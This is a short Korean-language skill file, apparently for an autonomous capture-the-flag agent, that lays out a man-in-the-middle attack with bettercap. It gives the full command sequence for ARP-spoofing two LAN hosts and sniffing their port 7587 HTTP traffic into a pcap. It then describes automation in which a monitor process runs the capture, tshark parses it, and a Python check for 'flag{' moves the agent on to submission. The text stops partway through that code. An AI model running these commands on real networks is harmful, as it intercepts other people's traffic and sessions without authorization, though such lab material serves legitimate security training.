# skill: mitm_with_bettercap

## 목적

동일한 VM 내부 LAN에서 B와 C 사이의 HTTP 통신을 관찰하고,
7587 포트의 요청/응답에서 flag 후보, 엔드포인트, 상태 코드, 세션 흐름을 추출한다.

## 대상

- B: 192.168.0.6
- C: 192.168.0.17
- Port: 7587

## bettercap 실행 절차


sudo bettercap -iface eth0
arp.spoof off
set arp.spoof.internal true
set arp.spoof.targets 192.168.0.6,192.168.0.17
arp.spoof on

set net.sniff.filter "host 192.168.0.6 and host 192.168.0.17 and port 7587"
set net.sniff.output runtime/mitm_capture.pcap
set net.sniff.verbose true
net.sniff on



## 종료 절차
net.sniff off
arp.spoof off
quit


자동화 설계
core.monitor가 bettercap을 병렬 프로세스로 실행한다.
pcap은 runtime/mitm_capture.pcap에 저장한다.
tshark가 pcap을 주기적으로 분석한다.
유의미한 이벤트는 runtime/monitor.jsonl에 저장한다.
flag 후보 또는 HTTP 흐름 요약은 memory/summary.txt에 반영한다.

---

## 8. pcap 분석 결과를 agent가 flag 제출로 이어가게 하기

현재 `classify_result()`에는 이미 `flag{` 탐지 로직이 있습니다.

```python
if "flag{" in stdout.lower() or "flag{" in response.lower():
    return True, "플래그 형식 문자열이 관찰되어 제출 단계로 진행 가능함"
